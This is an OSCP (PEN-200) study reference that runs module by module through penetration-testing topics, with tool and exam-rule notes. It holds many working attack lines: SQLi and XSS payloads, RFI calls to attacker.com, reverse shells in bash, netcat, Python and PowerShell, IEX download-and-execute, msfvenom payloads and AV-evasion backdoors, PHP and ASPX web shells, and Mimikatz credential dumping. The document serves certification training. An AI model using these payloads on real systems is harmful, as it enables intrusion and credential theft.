# OSCP (Offensive Security Certified Professional) Curriculum Reference

A comprehensive reference document for the OSCP certification (PEN-200) curriculum, covering all exam topics, domains, required skills, and techniques. This document serves as a gap analysis reference for the pwnbox knowledge base.

---

## Table of Contents

1. [Exam Overview](#exam-overview)
2. [PEN-200 Course Modules](#pen-200-course-modules)
3. [Information Gathering](#information-gathering)
4. [Vulnerability Scanning](#vulnerability-scanning)
5. [Web Application Attacks](#web-application-attacks)
6. [Buffer Overflows](#buffer-overflows)
7. [Client-Side Attacks](#client-side-attacks)
8. [Locating and Fixing Public Exploits](#locating-and-fixing-public-exploits)
9. [File Transfers](#file-transfers)
10. [Antivirus Evasion](#antivirus-evasion)
11. [Privilege Escalation - Windows](#privilege-escalation---windows)
12. [Privilege Escalation - Linux](#privilege-escalation---linux)
13. [Password Attacks](#password-attacks)
14. [Port Redirection and Tunneling](#port-redirection-and-tunneling)
15. [Active Directory Attacks](#active-directory-attacks)
16. [Metasploit Framework](#metasploit-framework)
17. [Shells and Payloads](#shells-and-payloads)
18. [Lab Environment](#lab-environment)
19. [Exam Format and Requirements](#exam-format-and-requirements)
20. [Tool Reference](#tool-reference)
21. [Knowledge Base Gap Analysis](#knowledge-base-gap-analysis)

---

## Exam Overview

### OSCP+ Certification (Effective November 1, 2024)

The OSCP (Offensive Security Certified Professional) is OffSec's foundational penetration testing certification, earned by passing the PEN-200 exam. As of November 2024, passing the exam awards both:

- **OSCP**: Lifetime credential that does not expire
- **OSCP+**: 3-year active status, renewable via recertification exam, another qualifying OffSec certification, or CPEs

### Key Statistics

- **Course Hours**: 284+ hours of content
- **Course Price**: Starting at $1,749 (course + exam bundle)
- **Exam Duration**: 23 hours 45 minutes hands-on + 24 hours for report submission
- **Passing Score**: 70 out of 100 points
- **Prerequisites**: TCP/IP networking, Windows/Linux administration, basic Bash/Python scripting

---

## PEN-200 Course Modules

The PEN-200 (Penetration Testing with Kali Linux) course consists of 23 learning modules:

### Module List

| # | Module Name | Key Topics |
|---|-------------|------------|
| 1 | General Course Introduction | Kali VM setup, VPN connection, course structure |
| 2 | Introduction to Cybersecurity | Threats, threat actors, CIA triad, security principles |
| 3 | Effective Learning Strategies | OffSec learning methodology, "Try Harder" mindset |
| 4 | Report Writing for Penetration Testers | Note-taking, technical report writing, lifecycle documentation |
| 5 | Information Gathering | Passive/active reconnaissance, OSINT, enumeration |
| 6 | Vulnerability Scanning | Automated scanning, manual analysis, vulnerability assessment |
| 7 | Introduction to Web Applications | Web technologies, HTTP, web architecture |
| 8 | Common Web Application Attacks | XSS, command injection, file upload, directory traversal |
| 9 | SQL Injection Attacks | SQLi techniques, blind SQLi, exploitation |
| 10 | Client-Side Attacks | Phishing, macro payloads, HTA exploitation |
| 11 | Locating Public Exploits | SearchSploit, Exploit-DB, GitHub PoCs |
| 12 | Fixing Exploits | Modifying exploits, debugging, cross-compiling |
| 13 | Antivirus Evasion | Encoding, obfuscation, in-memory execution |
| 14 | Password Attacks | Online/offline cracking, hash extraction, brute force |
| 15 | Windows Privilege Escalation | Token abuse, service misconfigurations, registry |
| 16 | Linux Privilege Escalation | SUID, sudo, kernel exploits, cron jobs |
| 17 | Advanced Tunneling | SSH tunneling, chisel, proxychains, pivoting |
| 18 | The Metasploit Framework | msfconsole, modules, payloads, post-exploitation |
| 19 | Active Directory Introduction and Enumeration | AD structure, manual/automated enumeration |
| 20 | Attacking Active Directory Authentication | Kerberoasting, AS-REP roasting, password attacks |
| 21 | Lateral Movement in Active Directory | PtH, PtT, WMI, WinRM, PsExec, DCOM |
| 22 | Assembling the Pieces | Full penetration test walkthrough |
| 23 | Trying Harder: The Labs | Challenge labs, mock exams |

### Learning Structure

- **Learning Modules**: Cover specific penetration testing concepts or techniques
- **Learning Units**: Atomic pieces of content within modules
- **Module Exercises**: Hands-on practice for each learning unit
- **Capstone Exercises**: Test entire module content
- **Challenge Labs**: Apply skills from multiple modules

---

## Information Gathering

### Passive Reconnaissance

Gathering information without directly interacting with target systems.

#### Techniques
- **WHOIS Lookups**: Domain registration information
- **DNS Enumeration**: Subdomain discovery, zone transfers
- **Google Dorking**: Advanced search operators for information disclosure
- **Social Media Intelligence (SOCMINT)**: Employee information, email addresses
- **Certificate Transparency Logs**: SSL/TLS certificate discovery
- **Wayback Machine**: Historical website content
- **Shodan/Censys**: Internet-wide scanning databases

#### Tools
- `whois`
- `dig`, `nslookup`, `host`
- `theHarvester`
- `Recon-ng`
- `OSINT Framework`

### Active Reconnaissance

Directly probing target systems to gather information.

#### Network Scanning

```bash
# Full TCP port scan
sudo nmap -Pn -p- -oN alltcp_ports.txt $IP

# Service version detection with default scripts
sudo nmap -Pn -sC -sV -p- -oN alltcp.txt $IP

# Top 20 UDP ports
sudo nmap -Pn -sU -sV -sC --top-ports=20 -oN top_20_udp_nmap.txt $IP

# Comprehensive scan
nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 $IP
```

#### Service Enumeration by Port

| Service | Port | Enumeration Commands |
|---------|------|---------------------|
| FTP | 21 | `nmap --script=ftp-anon.nse -p21 $IP` |
| SSH | 22 | `nmap -p22 --script=ssh-hostkey $IP` |
| SMTP | 25 | `nmap -p25 --script=smtp-commands,smtp-enum-users $IP` |
| DNS | 53 | `nmap -p53 --script=dns-zone-transfer $IP` |
| HTTP/S | 80/443 | `nikto -h $IP`, `gobuster dir -u http://$IP -w wordlist` |
| SMB | 139/445 | `nmap --script=smb-enum-shares,smb-enum-users $IP` |
| SNMP | 161/UDP | `snmpwalk -c public -v2c $IP` |
| LDAP | 389 | `ldapsearch -x -h $IP -b "dc=domain,dc=com"` |
| MSSQL | 1433 | `nmap -p1433 --script=ms-sql-info $IP` |
| MySQL | 3306 | `nmap -p3306 --script=mysql-info $IP` |
| RDP | 3389 | `nmap -p3389 --script=rdp-enum-encryption $IP` |

---

## Vulnerability Scanning

### Manual Vulnerability Analysis
- Version-based vulnerability research
- Configuration analysis
- Default credential testing
- Manual fuzzing

### Automated Tools (Note: Some restricted on exam)
- **Nmap NSE Scripts**: Allowed on exam
- **Nikto**: Web server scanner (allowed)
- **Nessus/OpenVAS**: NOT allowed on exam
- **Nuclei**: Template-based scanning

### Vulnerability Research Sources
- CVE databases (NIST NVD, CVE.org)
- Exploit-DB
- Vendor security advisories
- Security blogs and write-ups

---

## Web Application Attacks

### SQL Injection (SQLi)

#### Types
- **In-band SQLi**: Error-based, UNION-based
- **Blind SQLi**: Boolean-based, Time-based
- **Out-of-band SQLi**: DNS/HTTP exfiltration

#### Techniques
```sql
-- Authentication bypass
' OR 1=1--
' OR 'a'='a

-- UNION-based enumeration
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--

-- Time-based blind
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
```

#### Tools
- **sqlmap**: Automated SQLi (Note: may have exam restrictions)
- **Burp Suite**: Manual testing
- Manual exploitation

### Cross-Site Scripting (XSS)

#### Types
- **Reflected XSS**: Payload in URL/request
- **Stored XSS**: Persistent in database
- **DOM-based XSS**: Client-side manipulation

#### Payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### File Inclusion Vulnerabilities

#### Local File Inclusion (LFI)
```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://input (with POST data)
```

#### Remote File Inclusion (RFI)
```
?page=http://attacker.com/shell.txt
?page=\\attacker.com\share\shell.php
```

### Command Injection
```bash
; ls -la
| cat /etc/passwd
&& whoami
$(id)
`id`
```

### File Upload Attacks
- Extension bypass (.php5, .phtml, .phar)
- MIME type manipulation
- Magic byte injection
- Double extensions
- Null byte injection

### Directory Traversal
```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
```

---

## Buffer Overflows

> **Note**: As of 2023, buffer overflow modules were moved to the OffSec Learning Library. Vanilla buffer overflows are unlikely to appear on modern OSCP exams.

### Concepts (Still valuable for understanding)
- Stack-based buffer overflows
- Heap-based overflows
- Return address overwriting
- Shellcode injection
- NOP sleds

### Tools
- `pattern_create.rb` (allowed on exam)
- `pattern_offset.rb` (allowed on exam)
- `msfvenom` for shellcode generation
- Immunity Debugger / x64dbg
- GDB with PEDA/GEF

---

## Client-Side Attacks

### Microsoft Office Macros

VBA macros for code execution in Word/Excel documents.

```vba
Sub AutoOpen()
    ' Execute PowerShell reverse shell
    Shell "powershell -enc <base64_payload>"
End Sub
```

**Note**: Max macro string length is 50 characters; payloads must be split.

### HTML Application (HTA)

```bash
# Generate HTA payload with msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 -f hta-psh -o evil.hta
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f hta-psh -o evil64.hta
```

### Other Client-Side Vectors
- Malicious PDF files
- ODT files with embedded scripts
- Browser exploitation
- Phishing campaigns

> **Exam Note**: Client-side attacks are taught in PEN-200 but are "highly unlikely" to appear on the exam.

---

## Locating and Fixing Public Exploits

### SearchSploit / Exploit-DB

```bash
# Search for exploits
searchsploit apache 2.4
searchsploit -t webmin

# Copy exploit to current directory
searchsploit -m 12345

# View exploit details
searchsploit -p 12345

# Update database
searchsploit -u
```

### Other Sources
- GitHub (search: "CVE-XXXX-XXXX PoC")
- Packet Storm Security
- Security researcher blogs
- Vendor security advisories

### Fixing Exploits

Common modifications needed:
1. **IP/Port addresses**: Update LHOST, LPORT, RHOST
2. **Paths and URIs**: Adjust for target environment
3. **Python version**: Many old exploits are Python 2
4. **Dependencies**: Install required libraries
5. **Encoding issues**: Fix character encoding
6. **Compilation**: Cross-compile for target architecture

```bash
# Python 2 compatibility
python2.7 exploit.py

# Add execute permission
chmod +x exploit.py

# Cross-compile for Windows
i686-w64-mingw32-gcc exploit.c -o exploit.exe
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

### Safety Considerations
- Always review exploit code before execution
- Test in controlled environment first
- Watch for backdoors in public exploits

---

## File Transfers

### Linux File Transfers

#### HTTP Server (Attacker)
```bash
# Python 3
python3 -m http.server 80

# Python 2
python -m SimpleHTTPServer 80
```

#### Download Methods (Target)
```bash
# Wget
wget http://$IP/file

# Curl
curl http://$IP/file -o file

# Netcat
nc -lvp 1234 > file  # Receiver
nc $IP 1234 < file   # Sender
```

#### Base64 Transfer (No network tools)
```bash
# Attacker
cat file | base64 -w 0; echo

# Target
echo "<base64_content>" | base64 -d > file
```

### Windows File Transfers

#### PowerShell
```powershell
# Download file
(New-Object System.Net.WebClient).DownloadFile('http://$IP/file.exe','C:\file.exe')

# Download and execute in memory
IEX (New-Object System.Net.WebClient).DownloadString('http://$IP/script.ps1')

# Invoke-WebRequest
Invoke-WebRequest -Uri http://$IP/file -OutFile C:\file
```

#### Certutil
```cmd
certutil -urlcache -split -f http://$IP/file.exe file.exe
```
> **Note**: May be flagged by AV/AMSI

#### Bitsadmin
```cmd
bitsadmin /transfer job /download /priority high http://$IP/file C:\file
```

#### SMB Server (Impacket)
```bash
# Attacker
impacket-smbserver share $(pwd) -smb2support

# Target
copy \\$IP\share\file.exe C:\file.exe
```

#### FTP (Non-Interactive)
```cmd
echo open $IP 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

---

## Antivirus Evasion

> **Exam Note**: AV evasion is taught but not tested on the OSCP exam.

### On-Disk Evasion

#### Packers
- UPX (Universal Packer for eXecutables)
- Custom packers

#### Obfuscators
- Code reorganization
- Dead code insertion
- Instruction substitution

#### Crypters
- Payload encryption with runtime decryption stub

#### Msfvenom Encoding
```bash
# Shikata_ga_nai encoder (polymorphic)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=443 \
  -f exe -e x86/shikata_ga_nai -i 9 -o payload.exe

# Embed in legitimate executable
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 \
  -f exe -e x86/shikata_ga_nai -x calc.exe -o malicious_calc.exe
```

### In-Memory Evasion

#### Remote Process Memory Injection
- Allocate memory in target process
- Copy shellcode
- Execute in new thread

#### Reflective DLL Injection
- Load DLL from memory without touching disk

### Tools
- **Shellter**: PE backdooring tool
- **Veil-Evasion**: Payload generation framework
- **Hyperion**: PE crypter
- **ThreatCheck**: Identify flagged bytes

### Tips
- 64-bit payloads often evade more AV than 32-bit
- Custom templates improve evasion rates
- Modify shellcode (even 1 byte can help)
- Test against target AV in lab

---

## Privilege Escalation - Windows

### Enumeration

#### Manual Commands
```cmd
whoami /priv
whoami /groups
net users
net localgroup administrators
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

#### Automated Tools
- **WinPEAS**: Comprehensive enumeration
- **PowerUp**: PowerShell privilege escalation
- **JAWS**: Just Another Windows Script
- **Seatbelt**: Security-oriented enumeration

### Common Techniques

#### 1. Token Abuse (SeImpersonatePrivilege)
```cmd
# Check privileges
whoami /priv

# If SeImpersonatePrivilege is enabled:
# Use PrintSpoofer, GodPotato, JuicyPotato, etc.
PrintSpoofer.exe -i -c cmd
```

#### 2. AlwaysInstallElevated
```cmd
# Check registry
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1, create malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=443 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
```

#### 3. Unquoted Service Paths
```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Place malicious executable in writable location within path
```

#### 4. Service Permissions
```cmd
# Check service permissions with accesschk
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Modify vulnerable service
sc config VulnSvc binpath= "C:\path\to\payload.exe"
sc stop VulnSvc
sc start VulnSvc
```

#### 5. Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
# Look for tasks running as SYSTEM with writable binaries
```

#### 6. Credential Harvesting
```cmd
# Cached credentials
cmdkey /list

# PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Search for passwords in files
findstr /si password *.txt *.xml *.ini *.config
```

#### 7. Registry Autoruns
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### Resources
- **LOLBAS Project**: Living Off The Land Binaries
- **Windows Exploit Suggester**
- **Watson**: .NET vulnerability finder

---

## Privilege Escalation - Linux

### Enumeration

#### Manual Commands
```bash
# User context
id
whoami
groups

# System information
uname -a
cat /etc/os-release
cat /proc/version

# Network
ip a
netstat -tulpn
ss -tulpn

# Running processes
ps aux

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Sudo permissions
sudo -l
```

#### Automated Tools
- **LinPEAS**: Comprehensive enumeration
- **LinEnum**: Linux enumeration script
- **linux-exploit-suggester**: Kernel exploit suggestions
- **pspy**: Process monitoring

### Common Techniques

#### 1. SUID Binary Exploitation
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check GTFOBins for exploitation techniques
# Example: SUID on vim
vim -c ':!/bin/bash'
```

#### 2. Sudo Abuse
```bash
# Check sudo permissions
sudo -l

# Common sudo exploits (check GTFOBins)
# Example: sudo vim
sudo vim -c ':!/bin/bash'

# Example: sudo find
sudo find /etc -exec /bin/bash \;
```

#### 3. Kernel Exploits
```bash
# Check kernel version
uname -a

# Search for exploits
searchsploit linux kernel 4.4

# Common exploits: DirtyCow, DirtyPipe
```
> **Note**: Kernel exploits can crash systems; use as last resort

#### 4. Cron Jobs
```bash
# Check cron files
cat /etc/crontab
ls -la /etc/cron.d/

# Look for writable scripts run by root
# Monitor with pspy if needed
```

#### 5. Writable /etc/passwd
```bash
# If writable, add new root user
openssl passwd -1 -salt salt password
echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot
```

#### 6. Capabilities
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Example: python with cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### 7. NFS Shares (no_root_squash)
```bash
# Check exports
cat /etc/exports
# If no_root_squash, mount from attacker and create SUID binary
```

#### 8. PATH Hijacking
```bash
# If a script uses relative paths
# Create malicious binary in writable PATH directory
```

### Resources
- **GTFOBins**: Unix binary exploitation
- **Linux Exploit Suggester**
- **PayloadsAllTheThings**

---

## Password Attacks

### Online Attacks

#### Hydra
```bash
# SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4

# FTP
hydra -l admin -P passwords.txt ftp://$IP

# HTTP POST Form
hydra -l admin -P passwords.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# HTTP Basic Auth
hydra -l admin -P passwords.txt $IP http-get /admin

# SMB
hydra -l admin -P passwords.txt smb://$IP

# RDP
hydra -l admin -P passwords.txt rdp://$IP
```

#### CrackMapExec / NetExec
```bash
# SMB password spray
crackmapexec smb $IP -u users.txt -p passwords.txt

# Check for password reuse
crackmapexec smb $IP -u user -p password --continue-on-success
```

### Offline Attacks

#### John the Ripper
```bash
# Crack Linux hashes
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# With rules
john --wordlist=rockyou.txt --rules hashes.txt

# Show cracked passwords
john --show hashes.txt
```

#### Hashcat
```bash
# Identify hash type
hashcat -h | grep -i "ntlm"

# Crack NTLM (mode 1000)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack Kerberos TGS (mode 13100)
hashcat -m 13100 krb5tgs.txt rockyou.txt

# With rules
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Hash Extraction Tools
```bash
# SSH private key
ssh2john id_rsa > id_rsa.hash

# ZIP file
zip2john file.zip > zip.hash

# KeePass database
keepass2john database.kdbx > keepass.hash

# Office documents
office2john document.docx > office.hash

# PDF
pdf2john file.pdf > pdf.hash
```

### Hash Types Reference

| Hash Type | Hashcat Mode | Example |
|-----------|--------------|---------|
| MD5 | 0 | 5d41402abc4b2a76b9719d911017c592 |
| SHA1 | 100 | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
| NTLM | 1000 | 32ed87bdb5fdc5e9cba88547376818d4 |
| NetNTLMv2 | 5600 | user::DOMAIN:challenge:response |
| Kerberos 5 TGS | 13100 | $krb5tgs$23$*... |
| Kerberos 5 AS-REP | 18200 | $krb5asrep$23$... |
| bcrypt | 3200 | $2a$10$... |

---

## Port Redirection and Tunneling

### SSH Tunneling

#### Local Port Forwarding
```bash
# Forward local port 8080 to remote port 80
ssh -L 8080:target:80 user@pivot

# Access remote MySQL through pivot
ssh -L 3306:internal-db:3306 user@pivot
```

#### Dynamic Port Forwarding (SOCKS Proxy)
```bash
# Create SOCKS proxy on local port 9050
ssh -D 9050 user@pivot

# Use with proxychains
proxychains nmap -sT -Pn target
```

#### Remote Port Forwarding
```bash
# Make attacker port accessible from target network
ssh -R 8080:localhost:80 user@attacker
```

### Chisel

HTTP tunneling tool that works over restricted networks.

#### Reverse SOCKS Proxy
```bash
# Attacker (server)
chisel server -p 8080 --reverse

# Target (client)
chisel client ATTACKER_IP:8080 R:socks
```

#### Local Port Forward
```bash
# Target (server)
chisel server -p 8080 --host 0.0.0.0

# Attacker (client)
chisel client TARGET_IP:8080 127.0.0.1:3306:internal:3306
```

### Ligolo-ng

Modern tunneling tool with TUN interface.

```bash
# Attacker: Start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Target: Connect agent
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Attacker: Start tunnel
session
start
```

### Proxychains

```bash
# Configure /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Use with tools
proxychains nmap -sT -Pn $IP
proxychains curl http://internal-target
```

### Windows Tools

#### Plink (PuTTY CLI)
```cmd
plink.exe -ssh -l user -pw password -R 8080:127.0.0.1:80 attacker-ip
```

#### Netsh Port Forwarding
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal-ip
```

### sshuttle

Full VPN-like access through SSH.

```bash
sshuttle -r user@pivot 10.10.10.0/24
```

---

## Active Directory Attacks

### AD Enumeration

#### Manual Enumeration (PowerShell)
```powershell
# Domain information
Get-ADDomain
Get-ADDomainController

# Users
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Groups
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"

# Computers
Get-ADComputer -Filter * -Properties *
```

#### BloodHound / SharpHound
```powershell
# Collect data
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword password
```

#### PowerView
```powershell
# Import module
Import-Module .\PowerView.ps1

# Enumeration
Get-NetDomain
Get-NetDomainController
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
```

### Authentication Attacks

#### Kerberoasting
```bash
# Impacket
GetUserSPNs.py domain/user:password -dc-ip $DC_IP -request

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

#### AS-REP Roasting
```bash
# Impacket (no password needed)
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip $DC_IP

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack with hashcat
hashcat -m 18200 asrep.txt wordlist.txt
```

#### Password Spraying
```bash
# CrackMapExec
crackmapexec smb $DC_IP -u users.txt -p 'Summer2024!' --continue-on-success

# Kerbrute
kerbrute passwordspray -d domain.local users.txt 'Summer2024!'
```

### Lateral Movement

#### Pass the Hash (PtH)
```bash
# Impacket psexec
psexec.py domain/user@target -hashes :NTLM_HASH

# CrackMapExec
crackmapexec smb $IP -u user -H NTLM_HASH -x "whoami"

# Evil-WinRM
evil-winrm -i $IP -u user -H NTLM_HASH
```

#### Pass the Ticket (PtT)
```powershell
# Rubeus - Import ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz
kerberos::ptt ticket.kirbi
```

#### Overpass the Hash
```bash
# Impacket
getTGT.py domain/user -hashes :NTLM_HASH
export KRB5CCNAME=user.ccache
psexec.py domain/user@target -k -no-pass
```

### Ticket Attacks

#### Golden Ticket
```powershell
# Requires krbtgt hash
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator
```

#### Silver Ticket
```powershell
# Requires service account hash
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

### Credential Dumping

#### Mimikatz
```powershell
# Dump logon passwords
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam

# DCSync
lsadump::dcsync /domain:domain.local /user:Administrator
```

#### Impacket secretsdump
```bash
# Remote
secretsdump.py domain/user:password@$DC_IP

# Local (with hashes)
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### Tools Summary
- **Mimikatz**: Credential extraction
- **Rubeus**: Kerberos abuse
- **BloodHound/SharpHound**: AD visualization
- **PowerView**: AD enumeration
- **Impacket**: Python AD toolkit
- **CrackMapExec/NetExec**: Swiss army knife for AD
- **Evil-WinRM**: WinRM shell
- **Kerbrute**: Kerberos brute force

---

## Metasploit Framework

### Exam Restrictions

> **CRITICAL**: Metasploit can only be used against ONE target machine on the exam.

**Allowed on all targets:**
- `multi/handler` (exploit/multi/handler)
- `msfvenom`
- `pattern_create.rb`
- `pattern_offset.rb`

**Restricted (one target only):**
- Auxiliary modules
- Exploit modules
- Post modules
- Meterpreter payloads

### Basic Usage

```bash
# Start msfconsole
msfconsole

# Search for modules
search type:exploit platform:windows smb

# Use module
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options
show targets
show payloads

# Set options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 443

# Run exploit
exploit
run
```

### Multi/Handler
```bash
# Set up listener
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 192.168.1.50
set LPORT 443
exploit -j
```

### Msfvenom Payloads

```bash
# Windows reverse shell (staged)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=443 -f exe -o shell.exe

# Windows reverse shell (stageless)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=$IP LPORT=443 -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=443 -f raw -o shell.jsp

# WAR file
msfvenom -p java/shell_reverse_tcp LHOST=$IP LPORT=443 -f war -o shell.war

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f aspx -o shell.aspx

# Python
msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=443 -f raw

# PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f psh-cmd
```

**Note**: Staged payloads (shell/reverse_tcp) require Metasploit handler. Stageless payloads (shell_reverse_tcp) work with netcat.

---

## Shells and Payloads

### Reverse Shells

#### Bash
```bash
bash -i >& /dev/tcp/$IP/443 0>&1
bash -c 'bash -i >& /dev/tcp/$IP/443 0>&1'
```

#### Netcat
```bash
# Traditional
nc -e /bin/bash $IP 443

# Without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP 443 > /tmp/f
```

#### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell Stabilization

#### Python PTY
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Or
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Full TTY Upgrade
```bash
# In reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background

# On attacker
stty raw -echo; fg

# In shell
export TERM=xterm
stty rows 38 cols 116
```

#### rlwrap
```bash
# Wrap netcat listener
rlwrap nc -lvnp 443
```

### Web Shells

#### PHP
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

#### ASPX
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%= Process.Start(new ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) { UseShellExecute = false, RedirectStandardOutput = true }).StandardOutput.ReadToEnd() %>
```

---

## Lab Environment

### PEN-200 Lab Structure

- **70+ machines** for practice
- **Challenge Labs**: Progressive difficulty sets
- **Capstone Labs**: Module-specific challenges
- **Mock OSCP environments**: Exam simulation

### Challenge Lab Sets
- Medtech
- OSCP A
- OSCP B
- Secura

### Lab Recommendations
- Complete at least 30 lab machines
- Focus on machines simulating exam conditions
- Practice under time constraints
- Document methodology and take notes

### External Practice Resources

#### HackTheBox
- Free tier available
- Retired machines (VIP)
- TJnull's OSCP-like list

#### Proving Grounds (OffSec)
- Play (free) and Practice (paid)
- Retired OSCP machines
- Similar difficulty to exam

#### VulnHub
- Free downloadable VMs
- Good for offline practice

#### TryHackMe
- Guided learning paths
- OSCP preparation rooms

---

## Exam Format and Requirements

### Exam Structure (November 2024+)

| Component | Machines | Points | Notes |
|-----------|----------|--------|-------|
| Active Directory Set | 3 machines | 40 points | "Assumed breach" - start with low-priv creds |
| Standalone Machines | 3 machines | 60 points (20 each) | 10 pts initial access + 10 pts privesc |
| **Total** | **6 machines** | **100 points** | **70 points to pass** |

### Time Limits
- **Exam**: 23 hours 45 minutes
- **Report**: 24 hours after exam ends

### Allowed Tools

| Category | Allowed | Restricted/Banned |
|----------|---------|-------------------|
| Scanning | Nmap, Nikto, dirb, gobuster, feroxbuster | Nessus, OpenVAS, Nexpose |
| Exploitation | Manual exploits, msfvenom, multi/handler | SQLmap, db_autopwn, browser_autopwn |
| Metasploit | One target only | Multiple targets |
| Commercial | Burp Free | Burp Pro, Metasploit Pro |
| AI/LLM | None allowed | ChatGPT, Claude, any AI chatbots |

### Metasploit Restrictions (Detailed)
- Can use Auxiliary, Exploit, and Post modules on **ONE** target only
- Once used, cannot use on any other target
- Allowed on all targets: `multi/handler`, `msfvenom`, `pattern_create.rb`, `pattern_offset.rb`
